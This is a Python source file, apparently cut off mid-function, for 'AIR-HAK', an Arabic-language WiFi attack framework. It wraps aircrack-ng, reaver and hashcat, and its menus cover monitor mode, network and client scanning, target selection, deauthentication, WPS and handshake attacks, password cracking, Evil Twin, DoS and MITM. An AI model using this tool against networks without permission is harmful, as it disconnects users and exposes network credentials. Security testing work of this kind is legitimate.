#!/usr/bin/env python3
"""
AIR-HAK - أداة احترافية لاختبار اختراق الواي فاي
نسخة متقدمة مع واجهة TUI، تعدد المهام، وتكامل مع أدوات احترافية
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
from datetime import datetime
from queue import Queue
import select
import fcntl
import termios
import struct
import random
import hashlib

# مكتبات إضافية
try:
    from prompt_toolkit import Application
    from prompt_toolkit.layout import Layout
    from prompt_toolkit.widgets import Box, Frame, TextArea
    from prompt_toolkit.key_binding import KeyBindings
    from prompt_toolkit.layout.controls import FormattedTextControl
    from prompt_toolkit.layout.containers import HSplit, VSplit
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

# تعريف الألوان
class Colors:
    # Basic colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    # Bright colors
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    
    # Styles
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    
    # Reset
    RESET = '\033[0m'
    RESET_BOLD = '\033[21m'
    RESET_DIM = '\033[22m'
    RESET_UNDERLINE = '\033[24m'
    RESET_BLINK = '\033[25m'
    RESET_REVERSE = '\033[27m'
    RESET_HIDDEN = '\033[28m'

class NetworkDevice:
    """تمثيل جهاز شبكة"""
    def __init__(self, mac, ip=None, vendor=None, signal=0, packets=0):
        self.mac = mac
        self.ip = ip
        self.vendor = vendor
        self.signal = signal
        self.packets = packets
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()

class TargetAP:
    """تمثيل نقطة وصول مستهدفة"""
    def __init__(self, bssid, essid, channel, encryption, signal, clients=None):
        self.bssid = bssid
        self.essid = essid
        self.channel = channel
        self.encryption = encryption
        self.signal = signal
        self.clients = clients or []
        self.handshake_captured = False
        self.wps_locked = False
        self.wps_pin = None
        self.psk = None

class WiFiPentestFramework:
    """الإطار الرئيسي للأداة"""
    
    def __init__(self):
        self.check_root()
        self.check_dependencies()
        self.setup_signals()
        
        # إعدادات
        self.interface = None
        self.monitor_interface = None
        self.targets = []
        self.clients = []
        self.current_target = None
        self.attack_running = False
        self.deauth_running = False
        self.capture_running = False
        
        # الطوابير للتواصل بين الخيوط
        self.log_queue = Queue()
        self.event_queue = Queue()
        
        # إعدادات التهيئة
        self.config = self.load_config()
        
        # المجلدات
        self.setup_directories()
        
        # تشغيل الخيوط المساعدة
        self.start_worker_threads()
        
        # عرض البانر
        self.show_banner()
        
        # بدء الواجهة
        if GUI_AVAILABLE and self.config.get('use_gui', False):
            self.start_gui()
        else:
            self.start_tui()
    
    def check_root(self):
        """التحقق من صلاحيات الجذر"""
        if os.geteuid() != 0:
            print(f"{Colors.BRIGHT_RED}[✗] تحتاج صلاحيات root! استخدم:{Colors.RESET}")
            print(f"{Colors.BRIGHT_YELLOW}    sudo {sys.argv[0]}{Colors.RESET}")
            sys.exit(1)
    
    def check_dependencies(self):
        """التحقق من الأدوات المطلوبة"""
        required_tools = [
            'aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng',
            'iwconfig', 'iw', 'ip', 'macchanger', 'wash', 'reaver',
            'bully', 'hcxdumptool', 'hcxpcapngtool', 'hashcat',
            'hostapd', 'dnsmasq', 'lighttpd', 'ettercap', 'bettercap',
            'nmap', 'tshark', 'wireshark', 'mdk4', 'mdk3'
        ]
        
        missing = []
        for tool in required_tools:
            if subprocess.run(['which', tool], capture_output=True).returncode != 0:
                missing.append(tool)
        
        if missing:
            print(f"{Colors.BRIGHT_YELLOW}[!] أدوات مفقودة:{Colors.RESET}")
            for tool in missing:
                print(f"    - {tool}")
            
            response = input(f"\n{Colors.BRIGHT_BLUE}[?] تثبيت الأدوات المفقودة؟ (y/N): {Colors.RESET}")
            if response.lower() == 'y':
                self.install_dependencies(missing)
    
    def install_dependencies(self, tools):
        """تثبيت الأدوات المفقودة"""
        print(f"{Colors.BRIGHT_YELLOW}[*] جارٍ تثبيت الأدوات...{Colors.RESET}")
        
        # تحديد مدير الحزم
        if os.path.exists('/usr/bin/apt'):
            pkg_manager = 'apt'
        elif os.path.exists('/usr/bin/yum'):
            pkg_manager = 'yum'
        elif os.path.exists('/usr/bin/pacman'):
            pkg_manager = 'pacman'
        else:
            print(f"{Colors.BRIGHT_RED}[✗] لم أتعرف على مدير الحزم{Colors.RESET}")
            return
        
        # تثبيت حسب التوزيعة
        if pkg_manager == 'apt':
            os.system('apt update && apt install -y kali-tools-wireless aircrack-ng reaver bully hashcat hcxdumptool hcxtools mdk4 hostapd dnsmasq lighttpd ettercap bettercap nmap tshark wireshark')
        elif pkg_manager == 'yum':
            os.system('yum install -y aircrack-ng reaver bully hashcat hcxdumptool hcxtools mdk4 hostapd dnsmasq lighttpd ettercap bettercap nmap tshark wireshark')
        
        print(f"{Colors.BRIGHT_GREEN}[✓] تم التثبيت{Colors.RESET}")
    
    def setup_signals(self):
        """إعداد معالجات الإشارات"""
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        """معالج الإشارات للتنظيف"""
        print(f"\n{Colors.BRIGHT_YELLOW}[*] استقبال إشارة {sig}، تنظيف...{Colors.RESET}")
        self.cleanup()
        sys.exit(0)
    
    def load_config(self):
        """تحميل الإعدادات"""
        config_file = '/etc/air-hak/config.json' if os.path.exists('/etc/air-hak/config.json') else 'config.json'
        
        default_config = {
            'interface': 'wlan0',
            'monitor_prefix': 'mon',
            'scan_time': 15,
            'deauth_packets': 10,
            'handshake_timeout': 300,
            'wps_timeout': 600,
            'wordlist_path': '/usr/share/wordlists/rockyou.txt',
            'save_captures': True,
            'auto_save': True,
            'use_gui': False,
            'language': 'ar',
            'log_level': 'INFO'
        }
        
        try:
            with open(config_file, 'r') as f:
                user_config = json.load(f)
                default_config.update(user_config)
        except:
            pass
        
        return default_config
    
    def setup_directories(self):
        """إنشاء المجلدات المطلوبة"""
        directories = ['captures', 'handshakes', 'wordlists', 'logs', 'reports', 'tmp']
        
        for directory in directories:
            os.makedirs(directory, exist_ok=True)
    
    def start_worker_threads(self):
        """بدء الخيوط المساعدة"""
        # خيط معالج السجلات
        log_thread = threading.Thread(target=self.log_worker, daemon=True)
        log_thread.start()
        
        # خيط معالج الأحداث
        event_thread = threading.Thread(target=self.event_worker, daemon=True)
        event_thread.start()
    
    def log_worker(self):
        """معالج السجلات"""
        while True:
            try:
                log_entry = self.log_queue.get()
                self.process_log_entry(log_entry)
            except:
                pass
    
    def event_worker(self):
        """معالج الأحداث"""
        while True:
            try:
                event = self.event_queue.get()
                self.process_event(event)
            except:
                pass
    
    def show_banner(self):
        """عرض البانر الاحترافي"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        banner = f"""
{Colors.BRIGHT_CYAN}{Colors.BOLD}
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                              ║
    ║   █████╗ ██╗██████╗     ██╗  ██╗ █████╗ ██╗  ██╗    {Colors.BRIGHT_RED}██╗  ██╗███████╗██╗     ██╗      ██████╗ {Colors.BRIGHT_CYAN}║
    ║  ██╔══██╗██║██╔══██╗    ██║  ██║██╔══██╗██║ ██╔╝    {Colors.BRIGHT_RED}██║  ██║██╔════╝██║     ██║     ██╔═══██╗{Colors.BRIGHT_CYAN}║
    ║  ███████║██║██████╔╝    ███████║███████║█████╔╝     {Colors.BRIGHT_RED}███████║█████╗  ██║     ██║     ██║   ██║{Colors.BRIGHT_CYAN}║
    ║  ██╔══██║██║██╔══██╗    ██╔══██║██╔══██║██╔═██╗     {Colors.BRIGHT_RED}██╔══██║██╔══╝  ██║     ██║     ██║   ██║{Colors.BRIGHT_CYAN}║
    ║  ██║  ██║██║██║  ██║    ██║  ██║██║  ██║██║  ██╗    {Colors.BRIGHT_RED}██║  ██║███████╗███████╗███████╗╚██████╔╝{Colors.BRIGHT_CYAN}║
    ║  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    {Colors.BRIGHT_RED}╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ {Colors.BRIGHT_CYAN}║
    ║                                                                              ║
    ║                    {Colors.BRIGHT_YELLOW}Advanced Wireless Penetration Testing Framework{Colors.BRIGHT_CYAN}           ║
    ║                    {Colors.BRIGHT_WHITE}Version 3.0 | By Security Experts{Colors.BRIGHT_CYAN}                         ║
    ║                                                                              ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
        print(banner)
        
        # معلومات النظام
        self.print_system_info()
        
        # التحذير القانوني
        warning = f"""
{Colors.BRIGHT_RED}{Colors.BOLD}⚠️  تحذير قانوني:{Colors.RESET}
{Colors.BRIGHT_YELLOW}هذه الأداة مخصصة للاختبار الأخلاقي والدفاعي فقط.
يُحظر استخدامها على شبكات لا تملكها أو بدون إذن كتابي.
المسؤولية القانونية تقع على المستخدم.{Colors.RESET}
"""
        print(warning)
        
        # طلب الموافقة
        response = input(f"{Colors.BRIGHT_BLUE}[?] هل توافق على الشروط وتتحمل المسؤولية؟ (y/N): {Colors.RESET}")
        if response.lower() != 'y':
            print(f"{Colors.BRIGHT_RED}[✗] تم رفض الشروط. الخروج...{Colors.RESET}")
            self.cleanup()
            sys.exit(0)
    
    def print_system_info(self):
        """طباعة معلومات النظام"""
        try:
            # معلومات النواة
            kernel = subprocess.check_output(['uname', '-r']).decode().strip()
            # معلومات الذاكرة
            with open('/proc/meminfo', 'r') as f:
                meminfo = f.read()
            # معلومات CPU
            with open('/proc/cpuinfo', 'r') as f:
                cpuinfo = f.read()
            
            info = f"""
{Colors.BRIGHT_CYAN}{Colors.BOLD}معلومات النظام:{Colors.RESET}
{Colors.BRIGHT_WHITE}• النواة:{Colors.RESET} {kernel}
{Colors.BRIGHT_WHITE}• المعالج:{Colors.RESET} {len([l for l in cpuinfo.split('\n') if 'processor' in l])} Core(s)
{Colors.BRIGHT_WHITE}• الذاكرة:{Colors.RESET} {int([l for l in meminfo.split('\n') if 'MemTotal' in l][0].split()[1]) // 1024} MB
{Colors.BRIGHT_WHITE}• نظام الملفات:{Colors.RESET} {subprocess.check_output(['df', '-h', '/']).decode().split('\n')[1].split()[1]}
"""
            print(info)
        except:
            pass
    
    def start_tui(self):
        """بدء واجهة TUI"""
        self.main_menu()
    
    def main_menu(self):
        """القائمة الرئيسية"""
        while True:
            os.system('clear')
            
            # معلومات النظام
            self.print_header()
            
            # القائمة
            menu = f"""
{Colors.BRIGHT_CYAN}{Colors.BOLD}القائمة الرئيسية:{Colors.RESET}

{Colors.BRIGHT_GREEN}[1]{Colors.RESET} إدارة الواجهات اللاسلكية
{Colors.BRIGHT_GREEN}[2]{Colors.RESET} مسح الشبكات اللاسلكية
{Colors.BRIGHT_GREEN}[3]{Colors.RESET} اختيار الهدف
{Colors.BRIGHT_GREEN}[4]{Colors.RESET} هجمات فك المصادقة (Deauth)
{Colors.BRIGHT_GREEN}[5]{Colors.RESET} هجمات WPS
{Colors.BRIGHT_GREEN}[6]{Colors.RESET} اعتراض مصافحة WPA/WPA2
{Colors.BRIGHT_GREEN}[7]{Colors.RESET} كسر كلمات المرور
{Colors.BRIGHT_GREEN}[8]{Colors.RESET} هجوم Evil Twin
{Colors.BRIGHT_GREEN}[9]{Colors.RESET} هجمات DoS المتقدمة
{Colors.BRIGHT_GREEN}[10]{Colors.RESET} هجمات MITM
{Colors.BRIGHT_GREEN}[11]{Colors.RESET} اختبارات أمنية متقدمة
{Colors.BRIGHT_GREEN}[12]{Colors.RESET} أدوات مساعدة
{Colors.BRIGHT_GREEN}[13]{Colors.RESET} الإعدادات
{Colors.BRIGHT_GREEN}[14]{Colors.RESET} التقارير
{Colors.BRIGHT_GREEN}[0]{Colors.RESET} الخروج

{Colors.BRIGHT_CYAN}══════════════════════════════════════════════════════════════════════{Colors.RESET}
"""
            print(menu)
            
            choice = input(f"\n{Colors.BRIGHT_BLUE}[?] اختر الخيار (0-14): {Colors.RESET}").strip()
            
            if choice == "1":
                self.interface_menu()
            elif choice == "2":
                self.scan_menu()
            elif choice == "3":
                self.target_selection_menu()
            elif choice == "4":
                self.deauth_menu()
            elif choice == "5":
                self.wps_menu()
            elif choice == "6":
                self.handshake_menu()
            elif choice == "7":
                self.cracking_menu()
            elif choice == "8":
                self.evil_twin_menu()
            elif choice == "9":
                self.dos_menu()
            elif choice == "10":
                self.mitm_menu()
            elif choice == "11":
                self.advanced_tests_menu()
            elif choice == "12":
                self.tools_menu()
            elif choice == "13":
                self.settings_menu()
            elif choice == "14":
                self.reports_menu()
            elif choice == "0":
                self.cleanup()
                print(f"{Colors.BRIGHT_GREEN}[✓] الخروج من الأداة{Colors.RESET}")
                sys.exit(0)
            else:
                print(f"{Colors.BRIGHT_RED}[✗] خيار غير صحيح!{Colors.RESET}")
                time.sleep(1)
    
    def print_header(self):
        """طباعة رأس الصفحة"""
        header = f"""
{Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BRIGHT_CYAN}║ {Colors.BRIGHT_WHITE}AIR-HAK v3.0{Colors.RESET}{Colors.BRIGHT_CYAN} | {Colors.BRIGHT_YELLOW}Interface: {self.interface or 'None'}{Colors.RESET}{Colors.BRIGHT_CYAN} | {Colors.BRIGHT_MAGENTA}Target: {self.current_target.essid if self.current_target else 'None'}{Colors.RESET}{Colors.BRIGHT_CYAN} ║{Colors.RESET}
{Colors.BRIGHT_CYAN}╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
        print(header)
    
    def interface_menu(self):
        """قائمة إدارة الواجهات"""
        while True:
            os.system('clear')
            self.print_header()
            
            print(f"{Colors.BRIGHT_CYAN}{Colors.BOLD}إدارة الواجهات اللاسلكية:{Colors.RESET}\n")
            
            # عرض الواجهات المتاحة
            self.list_interfaces()
            
            menu = f"""
{Colors.BRIGHT_GREEN}[1]{Colors.RESET} تفعيل وضع المراقبة
{Colors.BRIGHT_GREEN}[2]{Colors.RESET} تعطيل وضع المراقبة
{Colors.BRIGHT_GREEN}[3]{Colors.RESET} تغيير عنوان MAC
{Colors.BRIGHT_GREEN}[4]{Colors.RESET} فحص قدرات الواجهة
{Colors.BRIGHT_GREEN}[5]{Colors.RESET} اختبار أداء الواجهة
{Colors.BRIGHT_GREEN}[6]{Colors.RESET} العودة للقائمة الرئيسية

{Colors.BRIGHT_CYAN}══════════════════════════════════════════════════════════════════════{Colors.RESET}
"""
            print(menu)
            
            choice = input(f"\n{Colors.BRIGHT_BLUE}[?] اختر الخيار (1-6): {Colors.RESET}").strip()
            
            if choice == "1":
                self.enable_monitor_mode()
            elif choice == "2":
                self.disable_monitor_mode()
            elif choice == "3":
                self.change_mac_address()
            elif choice == "4":
                self.check_interface_capabilities()
            elif choice == "5":
                self.test_interface_performance()
            elif choice == "6":
                break
            else:
                print(f"{Colors.BRIGHT_RED}[✗] خيار غير صحيح!{Colors.RESET}")
                time.sleep(1)
    
    def list_interfaces(self):
        """عرض الواجهات اللاسلكية"""
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            
            interfaces = []
            current_iface = None
            for line in result.stdout.split('\n'):
                if line and not line.startswith(' '):
                    current_iface = line.split()[0]
                    if 'IEEE 802.11' in line:
                        interfaces.append(current_iface)
            
            print(f"{Colors.BRIGHT_WHITE}الواجهات المتاحة:{Colors.RESET}")
            for iface in interfaces:
                status = f"{Colors.BRIGHT_GREEN}✓{Colors.RESET}" if iface == self.interface else f"{Colors.BRIGHT_YELLOW}●{Colors.RESET}"
                mode = "Monitor" if "Mode:Monitor" in subprocess.check_output(['iw', iface, 'info']).decode() else "Managed"
                print(f"  {status} {iface} [{mode}]")
            
            if interfaces and not self.interface:
                self.interface = interfaces[0]
                print(f"\n{Colors.BRIGHT_YELLOW}[*] تم اختيار {self.interface} بشكل افتراضي{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}[✗] خطأ في قراءة الواجهات: {e}{Colors.RESET}")
    
    def enable_monitor_mode(self):
        """تفعيل وضع المراقبة"""
        if not self.interface:
            print(f"{Colors.BRIGHT_RED}[✗] لم يتم اختيار واجهة{Colors.RESET}")
            return
        
        print(f"{Colors.BRIGHT_YELLOW}[*] تفعيل وضع المراقبة على {self.interface}...{Colors.RESET}")
        
        try:
            # استخدام airmon-ng
            cmd = ['airmon-ng', 'start', self.interface]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if 'monitor mode enabled' in result.stdout:
                # البحث عن اسم الواجهة الجديدة
                for line in result.stdout.split('\n'):
                    if '(monitor mode)' in line:
                        self.monitor_interface = line.split()[1]
                        break
                
                print(f"{Colors.BRIGHT_GREEN}[✓] وضع المراقبة مفعل على {self.monitor_interface}{Colors.RESET}")
            else:
                # محاولة الطريقة اليدوية
                subprocess.run(['ip', 'link', 'set', self.interface, 'down'])
                subprocess.run(['iw', self.interface, 'set', 'monitor', 'control'])
                subprocess.run(['ip', 'link', 'set', self.interface, 'up'])
                self.monitor_interface = self.interface
                print(f"{Colors.BRIGHT_GREEN}[✓] وضع المراقبة مفعل{Colors.RESET}")
            
            time.sleep(2)
            
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}[✗] خطأ: {e}{Colors.RESET}")
            time.sleep(2)
    
    def scan_menu(self):
        """قائمة المسح"""
        while True:
            os.system('clear')
            self.print_header()
            
            print(f"{Colors.BRIGHT_CYAN}{Colors.BOLD}مسح الشبكات اللاسلكية:{Colors.RESET}\n")
            
            print(f"{Colors.BRIGHT_GREEN}[1]{Colors.RESET} مسح سريع (5G فقط)")
            print(f"{Colors.BRIGHT_GREEN}[2]{Colors.RESET} مسح شامل (2.4G + 5G)")
            print(f"{Colors.BRIGHT_GREEN}[3]{Colors.RESET} مسح مستمر مع تحديث حي")
            print(f"{Colors.BRIGHT_GREEN}[4]{Colors.RESET} مسح للشبكات المخفية")
            print(f"{Colors.BRIGHT_GREEN}[5]{Colors.RESET} مسح مع كشف العملاء")
            print(f"{Colors.BRIGHT_GREEN}[6]{Colors.RESET} مسح WPS فقط")
            print(f"{Colors.BRIGHT_GREEN}[7]{Colors.RESET} مسح مع تحليل الإشارة")
            print(f"{Colors.BRIGHT_GREEN}[8]{Colors.RESET} العودة")
            
            choice = input(f"\n{Colors.BRIGHT_BLUE}[?] اختر الخيار (1-8): {Colors.RESET}").strip()
            
            if choice == "1":
                self.perform_scan("5GHz")
            elif choice == "2":
                self.perform_scan("full")
            elif choice == "3":
                self.perform_continuous_scan()
            elif choice == "4":
                self.scan_hidden_networks()
            elif choice == "5":
                self.scan_with_clients()
            elif choice == "6":
                self.scan_wps_only()
            elif choice == "7":
                self.scan_with_signal_analysis()
            elif choice == "8":
                break
            else:
                print(f"{Colors.BRIGHT_RED}[✗] خيار غير صحيح!{Colors.RESET}")
                time.sleep(1)
    
    def perform_scan(self, scan_type):
        """تنفيذ مسح الشبكات"""
        if not self.monitor_interface:
            print(f"{Colors.BRIGHT_RED}[✗] يجب تفعيل وضع المراقبة أولاً{Colors.RESET}")
            time.sleep(2)
            return
        
        print(f"{Colors.BRIGHT_YELLOW}[*] بدء المسح ({scan_type})...{Colors.RESET}")
        
        try:
            # تحديد القنوات بناءً على نوع المسح
            if scan_type == "5GHz":
                channels = "36,40,44,48,149,153,157,161,165"
            elif scan_type == "full":
                channels = "1,2,3,4,5,6,7,8,9,10,11,36,40,44,48,149,153,157,161,165"
            else:
                channels = "1,6,11"
            
            # اسم ملف الإخراج
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"captures/scan_{timestamp}"
            
            # تشغيل airodump-ng
            cmd = [
                'airodump-ng',
                self.monitor_interface,
                '--write', output_file,
                '--output-format', 'csv,json',
                '--write-interval', '2',
                '--berlin', '10'
            ]
            
            if channels:
                cmd.extend(['-c', channels])
            
            print(f"{Colors.BRIGHT_CYAN}[*] الأمر: {' '.join(cmd)}{Colors.RESET}")
            print(f"{Colors.BRIGHT_YELLOW}[*] اضغط Ctrl+C لإيقاف المسح{Colors.RESET}")
            
            # تشغيل المسح في خيط منفصل
            scan_thread = threading.Thread(target=self.run_scan_command, args=(cmd, output_file))
            scan_thread.start()
            
            # عرض النتائج أثناء المسح
            self.display_scan_results(output_file)
            
            scan_thread.join()
            
        except KeyboardInterrupt:
            print(f"\n{Colors.BRIGHT_YELLOW}[*] تم إيقاف المسح{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}[✗] خطأ: {e}{Colors.RESET}")
        
        input(f"\n{Colors.BRIGHT_BLUE}[↵] اضغط Enter للمتابعة...{Colors.RESET}")
    
    def run_scan_command(self, cmd, output_file):
        """تشغيل أمر المسح"""
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # قراءة الإخراج في الوقت الحقيقي
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    # معالجة الإخراج (يمكن إضافة تحليل هنا)
                    pass
            
            process.wait()
            
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}[✗] خطأ في المسح: {e}{Colors.RESET}")
    
    def display_scan_results(self, output_file):
        """عرض نتائج المسح"""
        try:
            # قراءة ملف CSV
            csv_file = f"{output_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    lines = f.readlines()
                
                # تحليل النتائج
                networks = []
                clients = []
                parsing_networks = True
                
                for line in lines:
                    if 'Station MAC' in line:
                        parsing_networks = False
                        continue
                    
                    parts = [p.strip() for p in line.split(',')]
                    
                    if parsing_networks and len(parts) > 13:
                        if parts[0] and parts[0] != 'BSSID':
                            network = {
                                'bssid': parts[0],
                                'first_seen': parts[1],
                                'last_seen': parts[2],
                                'channel': parts[3],
                                'speed': parts[4],
                                'privacy': parts[5],
                                'cipher': parts[6],
                                'authentication': parts[7],
                                'power': parts[8],
                                'beacons': parts[9],
                                'iv': parts[10],
                                'lan_ip': parts[11],
                                'id_len': parts[12],
                                'essid': parts[13].strip('"'),
                                'key': parts[14] if len(parts) > 14 else ''
                            }
                            networks.append(network)
                    
                    elif not parsing_networks and len(parts) > 5:
                        if parts[0] and parts[0] != 'Station MAC':
                            client = {
                                'mac': parts[0],
                                'first_seen': parts[1],
                                'last_seen': parts[2],
                                'power': parts[3],
                                'packets': parts[4],
                                'bssid': parts[5],
                                'probed_essids': parts[6] if len(parts) > 6 else ''
                            }
                            clients.append(client)
                
                # عرض النتائج
                os.system('clear')
                self.print_header()
                
                print(f"{Colors.BRIGHT_CYAN}{Colors.BOLD}نتائج المسح:{Colors.RESET}\n")
                
                print(f"{Colors.BRIGHT_WHITE}الشبكات المكتشفة ({len(networks)}):{Colors.RESET}")
                print(f"{Colors.BRIGHT_CYAN}{'═' * 120}{Colors.RESET}")
                print(f"{Colors.BOLD}{'BSSID':<18} {'CH':<4} {'PWR':<5} {'ENC':<10} {'ESSID':<30} {'CLIENTS':<8}{Colors.RESET}")
                print(f"{Colors.BRIGHT_CYAN}{'═' * 120}{Colors.RESET}")
                
                for net in networks[:20]:  # عرض أول 20 شبكة فقط
                    # حساب عدد العملاء
                    client_count = len([c for c in clients if c['bssid'] == net['bssid']])
                    
                    # تحديد لون التشفير
                    if 'WPA3' in net['privacy']:
                        enc_color = Colors.BRIGHT_GREEN
                    elif 'WPA2' in net['privacy']:
                        enc_color = Colors.BRIGHT_YELLOW
                    elif 'WPA' in net['privacy']:
                        enc_color = Colors.BRIGHT_MAGENTA
                    elif 'WEP' in net['privacy']:
                        enc_color = Colors.BRIGHT_RED
                    else:
                        enc_color = Colors.BRIGHT_RED
                    
                    # عرض المعلومات
                    essid_display = net['essid'][:28] + '..' if len(net['essid']) > 30 else net['essid']
                    print(f"{net['bssid']:<18} {net['channel']:<4} {net['power']:<5} {enc_color}{net['privacy'][:10]:<10}{Colors.RESET} {essid_display:<30} {client_count:<8}")
                
                print(f"{Colors.BRIGHT_CYAN}{'═' * 120}{Colors.RESET}")
                
                if len(networks) > 20:
                    print(f"{Colors.BRIGHT_YELLOW}[*] عرض {min(20, len(networks))} من {len(networks)} شبكة{Colors.RESET}")
                
                # حفظ النتائج في الذاكرة
                self.targets = networks
                self.clients = clients
                
                # عرض خيارات الإجراء
                print(f"\n{Colors.BRIGHT_WHITE}الإجراءات:{Colors.RESET}")
                print(f"{Colors.BRIGHT_GREEN}[s]{Colors.RESET} اختيار شبكة مستهدفة")
                print(f"{Colors.BRIGHT_GREEN}[c]{Colors.RESET} عرض العملاء")
                print(f"{Colors.BRIGHT_GREEN}[w]{Colors.RESET} فحص WPS")
                print(f"{Colors.BRIGHT_GREEN}[x]{Colors.RESET} الخروج")
                
                return True
                
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}[✗] خطأ في عرض النتائج: {e}{Colors.RESET}")
            return False
        
        return False
    
    def target_selection_menu(self):
        """قائمة اختيار الهدف"""
        if not self.targets:
            print(f"{Colors.BRIGHT_RED}[✗] يجب إجراء مسح أولاً{Colors.RESET}")
            time.sleep(2)
            return
        
        while True:
            os.system('clear')
            self.print_header()
            
            print(f"{Colors.BRIGHT_CYAN}{Colors.BOLD}اختيار الهدف:{Colors.RESET}\n")
            
            # عرض الشبكات
            for i, net in enumerate(self.targets[:20], 1):
                client_count = len([c for c in self.clients if c['bssid'] == net['bssid']])
                selected = "✓" if self.current_target and self.current_target['bssid'] == net['bssid'] else " "
                print(f"{Colors.BRIGHT_GREEN}[{i}]{Colors.RESET} {selected} {net['bssid']} | CH:{net['channel']} | PWR:{net['power']} | {net['privacy']} | {net['essid'][:30]}")
            
            print(f"\n{Colors.BRIGHT_GREEN}[0]{Colors.RESET} العودة")
            
            choice = input(f"\n{Colors.BRIGHT_BLUE}[?] اختر رقم الشبكة (1-20): {Colors.RESET}").strip()
            
            if choice == "0":
                break
            elif choice.isdigit() and 1 <= int(choice) <= min(20, len(self.targets)):
                self.current_target = self.targets[int(choice) - 1]
                print(f"{Colors.BRIGHT_GREEN}[✓] تم اختيار الهدف: {self.current_target['essid']}{Colors.RESET}")
                
                # عرض قائمة الإجراءات على الهدف
                self.target_actions_menu()
            else:
                print(f"{Colors.BRIGHT_RED}[✗] خيار غير صحيح!{Colors.RESET}")
                time.sleep(1)
    
    def target_actions_menu(self):
        """قائمة الإجراءات على الهدف المحدد"""
        while True:
            os.system('clear')
            self.print_header()
            
            print(f"{Colors.BRIGHT_CYAN}{Colors.BOLD}الإجراءات على الهدف: {self.current_target['essid']}{Colors.RESET}\n")
            
            print(f"{Colors.BRIGHT_WHITE}معلومات الهدف:{Colors.RESET}")
            print(f"  {Colors.BRIGHT_YELLOW}BSSID:{Colors.RESET} {self.current_target['bssid']}")
            print(f"  {Colors.BRIGHT_YELLOW}ESSID:{Colors.RESET} {self.current_target['essid']}")
            print(f"  {Colors.BRIGHT_YELLOW}القناة:{Colors.RESET} {self.current_target['channel']}")
            print(f"  {Colors.BRIGHT_YELLOW}التشفير:{Colors.RESET} {self.current_target['privacy']}")
            print(f"  {Colors.BRIGHT_YELLOW}قوة الإشارة:{Colors.RESET} {self.current_target['power']}")
            
            client_count = len([c for c in self.clients if c['bssid'] == self.current_target['bssid']])
            print(f"  {Colors.BRIGHT_YELLOW}عدد العملاء:{Colors.RESET} {client_count}")
            
            print(f"\n{Colors.BRIGHT_WHITE}الإجراءات المتاحة:{Colors.RESET}")
            
            actions = [
                ("1", "هجوم Deauth", "قطع اتصال العملاء"),
                ("2", "اعتراض مصافحة WPA", "جمع handshake لكسر كلمة المرور"),
                ("3", "هجوم WPS", "استغلال ثغرة WPS"),
                ("4", "هجوم Evil Twin", "إنشاء شبكة مزيفة"),
                ("5", "فحص WPS", "كشف معلومات WPS"),
                ("6", "مراقبة الهدف", "مراقبة حركة الشبكة"),
                ("7", "هجوم Fragmentation", "هجمات تجزئة WPA"),
                ("8", "هجوم Michael", "هجمات TKIP"),
                ("9", "تحليل الإشارة", "تحليل قوة واستقرار الإشارة"),
                ("10", "كشف الثغرات", "فحص نقاط الضعف"),
                ("11", "العودة", "العودة للقائمة السابقة")
            ]
            
            for num, action, desc in actions:
                print(f"{Colors.BRIGHT_GREEN}[{num}]{Colors.RESET} {action:<20} - {desc}")
            
            choice = input(f"\n{Colors.BRIGHT_BLUE}[?] اختر الإجراء (1-11): {Colors.RESET}").strip()
            
            if choice == "1":
                self.deauth_attack_advanced()
            elif choice == "2":
                self.capture_handshake_advanced()
            elif choice == "3":
                self.wps_attack_advanced()
            elif choice == "4":
                self.evil_twin_attack()
            elif choice == "5":
                self.wps_scan_single()
            elif choice == "6":
                self.monitor_target()
            elif choice == "7":
                self.fragmentation_attack()
            elif choice == "8":
                self.michael_attack()
            elif choice == "9":
                self.signal_analysis()
            elif choice == "10":
                self.vulnerability_scan_single()
            elif choice == "11":
                break
            else:
                print(f"{Colors.BRIGHT_RED}[✗] خيار غير صحيح!{Colors.RESET}")
                time.sleep(1)
    
    def deauth_attack_advanced(self):
        """هجوم Deauth متقدم"""
        if not self.current_target:
            print(f"{Colors.BRIGHT_RED}[✗] لم يتم اختيار هدف{Colors.RESET}")
            return
        
